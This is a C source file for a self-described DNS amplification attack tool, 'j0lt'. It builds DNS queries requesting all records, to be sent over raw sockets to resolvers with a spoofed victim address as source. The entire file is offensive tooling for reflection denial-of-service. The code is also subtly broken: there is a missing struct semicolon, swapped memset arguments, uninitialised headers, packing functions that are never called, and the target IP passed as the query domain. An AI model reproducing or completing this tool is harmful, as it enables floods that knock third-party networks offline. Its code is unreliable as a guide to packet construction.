/*
 * ref: rfc 1034 & 1035
 * sudo tcpdump -X -n udp port 53
 *
 * ./j0lt <resolver> <resolver port> <target ip to spoof> <target port>
 */

#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <limits.h>
#include <errno.h> 

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> 
#include <arpa/inet.h>

#include <netdb.h>
#include <unistd.h>

#ifndef __BYTE_ORDER
#define     __LITTLE_ENDIAN 0x1
#define     __BYTE_ORDER __LITTLE_ENDIAN
#endif // __BYTE_ORDER

struct __attribute__((packed, aligned(1))) J0LT_UDPHDR
{
#if __BYTE_ORDER == __BIG_ENDIAN
    uint64_t    srcprt : 16;
    uint64_t    dstprt : 16;
    uint64_t    len : 16;
    uint64_t    checksum : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint64_t    checksum : 16;
    uint64_t    len : 16;
    uint64_t    dstprt : 16;
    uint64_t    srcprt : 16;
#endif
};

#define     FLAGS_DF 0b010
#define     FLAGS_MF 0b001
struct __attribute__((packed, aligned(1))) J0LT_TOS
{
#if __BYTE_ORDER == __BIG_ENDIAN
    uint8_t     precedence : 3;
    uint8_t     strm : 1;
    uint8_t     reliability : 2;
    uint8_t     sr : 1;
    uint8_t     speed : 1;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint8_t     speed : 1;
    uint8_t     sr : 1;
    uint8_t     reliability : 2;
    uint8_t     strm : 1;
    uint8_t     precedence : 3;
#endif; 
};

#define     IHL_MIN 5
#define     IHL_MAX 15

struct __attribute__((packed, aligned(1))) J0LT_PSEUDOHDR
{
    uint32_t sourceaddr;
    uint32_t destaddr;

#if __BYTE_ORDER == __BIGENDIAN 
    uint32_t zero : 8;
    uint32_t protocol : 8;
    uint32_t udplen : 16;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint32_t udplen : 16;
    uint32_t protocol : 8;
    uint32_t zero : 8;
#endif
}

struct __attribute__((packed, aligned(1))) J0LT_IPHDR
{
#if __BYTE_ORDER == __BIG_ENDIAN
    uint8_t     version : 4;    // format of the internet header (ipv4)
    uint8_t     ihl : 4;        // len of internet header in 32 bit words,
                                // points to the beginning of the data.
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint8_t     ihl : 4;
    uint8_t     version : 4;
#endif
    struct J0LT_TOS tos;
    uint16_t    total_len; // length of the datagram

    uint16_t    id;
#if __BYTE_ORDER == __BIG_ENDIAN
    uint16_t    flags : 3;
    uint16_t    offset : 13;
#endif 

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    uint16_t    offset : 13;
    uint16_t    flags : 3;
#endif 
    uint8_t     ttl; // maximum time
    uint8_t     protocol;
    uint16_t    checksum;
    uint32_t    sourceaddr;
    uint32_t    destaddr;
};
#define     IPVER 4
#define     ID 0x1337
#define     QR 0 // query (0), response (1).

typedef enum __opcode__ {
    OP_QUERY = 0,
    OP_IQUERY = 1,
    OP_STATUS = 2,
    OP_NOTIFY = 3,
    OP_UPDATE = 4
} opcode;
#define     OPCODE OP_QUERY

#define     AA 0 // Authoritative Answer
#define     TC 0 // TrunCation
#define     RD 1 // Recursion Desired   (END OF BYTE 3)
#define     RA 0 // Recursion Available
#define     Z  0 // Reserved
#define     AD 1 // Authentic Data (DNS-SEC)
#define     CD 0 // Checking Disabled (DNS-SEC)

typedef enum __rcode__ {
    RC_NO_ER = 0,
    RC_FMT_ERR = 1,
    RC_SRVR_FA = 2,
    RC_NAME_ER = 3,
    RC_NOT_IMP = 4,
    RC_REFUSED = 5
} rcode;
#define     RCODE RC_NO_ER

#define     QDCOUNT 1 // num entry question
#define     ANCOUNT 0 // num RR answer
#define     NSCOUNT 0 // num NS RR 
#define     ARCOUNT 0 // num RR additional

struct __attribute__((packed, aligned(1))) J0LT_DNSHDR
{
    uint16_t        id : 16;
#if __BYTE_ORDER == __BIG_ENDIAN
    // third byte
    uint8_t     qr : 1;
    uint8_t     opcode : 4;
    uint8_t     aa : 1;
    uint8_t     tc : 1;
    uint8_t     rd : 1;
    // fourth byte
    uint8_t     ra : 1;
    uint8_t     z : 1;
    uint8_t     ad : 1;
    uint8_t     cd : 1;
    uint8_t     rcode : 4;
#endif

#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
    // third byte
    uint8_t     rd : 1;
    uint8_t     tc : 1;
    uint8_t     aa : 1;
    uint8_t     opcode : 4;
    uint8_t     qr : 1;
    // fourth byte
    uint8_t     rcode : 4;
    uint8_t     cd : 1;
    uint8_t     ad : 1;
    uint8_t     z : 1;
    uint8_t     ra : 1;
#endif
    // remaining bytes
    uint16_t    qdcount : 16;
    uint16_t    ancount : 16;
    uint16_t    nscount : 16;
    uint16_t    arcount : 16;
};

typedef enum __type__ {
    T_A = 1,// host address
    T_NS = 2,// authoritative name server
    T_MD = 3,// mail destination
    T_MF = 4,// mail forwarder
    T_CNAME = 5,// canonical name for alias
    T_SOA = 6,// start of zone authority
    T_MB = 7,// mailbox domain name
    T_MG = 8,// mail group member
    T_MR = 9,// mail rename domain name
    T_NULL = 10, // null RR
    T_WKS = 11, // service description
    T_PTR = 12, // a domain name pointer
    T_HINFO = 13, // host information
    T_MINFO = 14, // mail list information
    T_MX = 15, // mail exchange
    T_TXT = 16, // text strings
    QT_AXFR = 252, // transfer of entire zone
    QT_MAILB = 253, // mailbox records 
    QT_MAILA = 254, // req mail agent RRs
    QT_ALL = 255 // req all records
} type;
#define     QTYPE QT_ALL

typedef enum __class__ {
    C_IN = 1, // the Internet
    C_CS = 2, // the CSNET class
    C_CH = 3, // the CHAOS class
    C_HS = 4, // Hesiod [Dyer 87]
    QC_ALL = 255, // anyclass
} class;
#define     QCLASS QC_ALL

#define DEFINE_INSERT_FN(typename, datatype)           \
        bool insert_##typename                         \
        (uint8_t** buf, size_t* buflen, datatype data) \
    {                                                  \
        uint64_t msb_mask, lsb_mask,                   \
            bigendian_data, lsb, msb;                  \
        size_t byte_pos, nbits;                        \
                                                       \
        if (*buflen < 1) {                             \
            return false;                              \
        }                                              \
                                                       \
        nbits = sizeof(data) << 3;                     \
        bigendian_data = 0ULL;                         \
        byte_pos = (nbits / 8) - 1;                    \
        lsb_mask = 0xffULL;                            \
        msb_mask = lsb_mask << nbits - 8;              \
                                                       \
        byte_pos = byte_pos << 3;                      \
        for (int i = nbits >> 4; i != 0; i--) {        \
            lsb = (data & lsb_mask);                   \
            msb = (data & msb_mask);                   \
            lsb <<= byte_pos;                          \
            msb >>= byte_pos;                          \
            bigendian_data |= lsb | msb;               \
            msb_mask >>= 8;                            \
            lsb_mask <<= 8;                            \
            byte_pos -= (2 << 3);                      \
        }                                              \
                                                       \
        data = bigendian_data == 0 ?                   \
            data : bigendian_data;                     \
        for (int i = sizeof(data);                     \
             *buflen != -1 && i > 0; i--) {            \
            *(*buf)++ = (data & 0xff);                 \
            data >>= 8;                                \
            (*buflen)--;                               \
        }                                              \
                                                       \
        return data == 0;                              \
    }                                                  \

DEFINE_INSERT_FN(byte, uint8_t)
DEFINE_INSERT_FN(word, uint16_t)
DEFINE_INSERT_FN(dword, uint32_t)
DEFINE_INSERT_FN(qword, uint64_t)
#undef DEFINE_INSERT_FN

#define     DEBUG   1
#define     BUF_MAX 0x200

const char* g_ansi = {
    " Usage: sudo ./j0lt [OPTION]...          \n"
    "                                         \n"
    "-d <dst>        : target server          \n"
    "-p <port>       : target port            \n"
    "-n <num>        : num UDP packets to send\n"
    "-r <dns rcrd>   : list of dns records    \n"
    "-s <dns srv>    : list of dns servers    \n"
    "-P <dns port>   : dns port (53)          \n"
    "                                         \n"
    " w3lc0m3 t0 j0lt                         \n"
    " a DNS amplification attack tool         \n"
    "                                         \n"
    "                                     2021\n"
    "            the-scientist@rootstorm.com\n\n"
};

bool
insert_question(void** buf, size_t* buflen,
        const char* domain,
        uint16_t query_type,
        uint16_t query_class);
bool
insert_data(void** dst, size_t* dst_buflen,
        const void* src, size_t src_len);
bool
insert_header(uint8_t** buf, size_t* buflen,
        const struct J0LT_DNSHDR* header);
bool
create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
        const struct J0LT_DNSHDR* header,
        const char* domain,
        uint16_t query_type,
        uint16_t query_class);
uint16_t
checksum(const long* addr, int count);

int
main(int argc, char** argv)
{
    struct sockaddr_in addr, srcaddr;
    socklen_t srcaddrlen;
    int raw_sockfd;

    size_t buflen, nwritten;
    uint8_t pktbuf[ BUF_MAX ];

    struct J0LT_DNSHDR sndheader = {
        ID,
        RD, TC, AA, OPCODE, QR,
        RCODE, CD, AD, Z, RA,
        QDCOUNT,
        ANCOUNT,
        NSCOUNT,
        ARCOUNT
    };

    struct J0LT_IPHDR iphdr;
    struct J0LT_UDPHDR udphdr;
    struct J0LT_PSEUDOHDR pseudohdr;

    printf("%s", g_ansi);

    if (argc != 5) {
        goto fail_state;
    }

    buflen = BUF_MAX;
    memset(pktbuf, BUF_MAX, 0);
    if (create_dns_packet(pktbuf, &buflen,
        &sndheader, argv[ 3 ],
        QTYPE, QCLASS) == false) {
        fprintf(stderr, "create_dns_packet error\n");
        goto fail_state;
    }

    raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sockfd == -1) {
        fprintf(stderr, "connect_client error\n");
        goto fail_state;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = udphdr.dstprt;
    addr.sin_addr.s_addr = iphdr.sourceaddr;

    // sockfd = connect_client(argv[ 1 ], argv[ 2 ], &addr);

    nwritten = BUF_MAX - buflen;
    sendto(raw_sockfd, pktbuf, nwritten, 0,
        ( const struct sockaddr* ) &addr,
        sizeof(addr));

    close(raw_sockfd);
    return 0;

fail_state:
    exit(EXIT_FAILURE);
}

void
pack_iphdr(struct J0LT_IPHDR* iphdr, struct J0LT_PSEUDOHDR* pseudohdr,
        const char* sourceip, const char* destip,
        size_t nwritten, size_t udpsz)
{
    memset(&iphdr, 0, sizeof(struct J0LT_IPHDR));
    iphdr->version = IPVER;
    iphdr->ihl = IHL_MIN;
    iphdr->total_len = htons(sizeof(struct J0LT_IPHDR) + nwritten + udpsz);
    iphdr->id = htonl(ID);
    iphdr->ttl = 0xff;
    iphdr->protocol = getprotobyname("udp")->p_proto;
    iphdr->sourceaddr = inet_addr(sourceip);
    iphdr->destaddr = inet_addr(destip);

    memset(&pseudohdr, 0, sizeof(struct J0LT_PSEUDOHDR));
    pseudohdr->protocol = iphdr->protocol;
    pseudohdr->destaddr = iphdr->destaddr;
    pseudohdr->sourceaddr = iphdr->sourceaddr;

    iphdr->checksum = checksum(&iphdr, sizeof(struct J0LT_IPHDR));
}

void
pack_udphdr(struct J0LT_UDPHDR* udphdr, struct J0LT_PSEUDOHDR* pseudohdr,
        size_t nwritten, const char* port, struct sockaddr_in* addr)
{
    uint16_t port_uint16;

    errno = 0;
    port_uint16 = ( uint16_t ) strtol(port, NULL, 0);
    if (errno != 0) {
        perror("port error: strtol");
        exit(EXIT_FAILURE);
    }

    memset(&udphdr, 0, sizeof(struct J0LT_UDPHDR));
    udphdr->dstprt = htons(port_uint16);
    udphdr->srcprt = 0x00;
    udphdr->len = htons(nwritten + sizeof(struct J0LT_UDPHDR));
    pseudohdr->udplen = udphdr->len;

    udphdr->checksum = checksum(&pseudohdr, sizeof(struct J0LT_PSEUDOHDR));
}

bool
create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
        const struct J0LT_DNSHDR* header,
        const char* domain,
        uint16_t query_type,
        uint16_t query_class)
{
    uint8_t* curpos = pktbuf;
    bool status = true;

    status &= insert_header(&curpos, buflen, header);
    status &= insert_question(( void** ) &curpos,
        buflen, domain,
        query_type, query_class);

    return status;
}

bool
insert_header(uint8_t** buf, size_t*
        buflen, const struct J0LT_DNSHDR* header)
{
    bool status;
    uint8_t third_byte, fourth_byte;

    third_byte = (
        header->rd |
        header->tc << 1 |
        header->aa << 2 |
        header->opcode << 3 |
        header->qr << 7
    );

    fourth_byte = (
        header->rcode |
        header->cd << 4 |
        header->ad << 5 |
        header->z << 6 |
        header->ra << 7
    );

    status = true;
    status &= insert_word(buf, buflen, header->id);

    status &= insert_byte(buf, buflen, third_byte);
    status &= insert_byte(buf, buflen, fourth_byte);

    status &= insert_word(buf, buflen, header->qdcount);
    status &= insert_word(buf, buflen, header->ancount);
    status &= insert_word(buf, buflen, header->nscount);
    status &= insert_word(buf, buflen, header->arcount);

    return status;
}

bool
insert_question(void** buf, size_t* buflen,
        const char* domain, uint16_t query_type,
        uint16_t query_class)
{
    const char* token;
    char* saveptr, qname[ BUF_MAX ];
    size_t srclen, domainlen;
    bool status;

    domainlen = strlen(domain) + 1;
    if (domainlen > BUF_MAX - 1) {
        return false;
    }
    memcpy(qname, domain, domainlen);

    token = strtok_r(qname, ".", &saveptr);
    if (token == NULL) {
        return false;
    }

    while (token != NULL) {
        srclen = strlen(token);
        insert_byte(( uint8_t** ) buf, buflen, srclen);
        insert_data(buf, buflen, token, srclen);
        token = strtok_r(NULL, ".", &saveptr);
    }

    status = true;
    status &= insert_byte(( uint8_t** ) buf,
        buflen, 0x00);
    status &= insert_word(( uint8_t** ) buf,
        buflen, query_type);
    status &= insert_word(( uint8_t** ) buf,
        buflen, query_class);

    return status;
}

bool
insert_data(void** dst, size_t* dst_buflen,
        const void* src, size_t src_len)
{
    if (*dst_buflen < src_len) {
        return false;
    }

    memcpy(*dst, src, src_len);
    *dst += src_len;
    *dst_buflen -= src_len;

    return true;
}

uint16_t
checksum(const long* addr, int count)
{
    register long sum = 0;

    while (count > 1) {
        sum += *( unsigned short* ) addr++;
        count -= 2;
    }

    if (count > 0) {
        sum += *( unsigned char* ) addr;
    }

    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return ~sum;
}
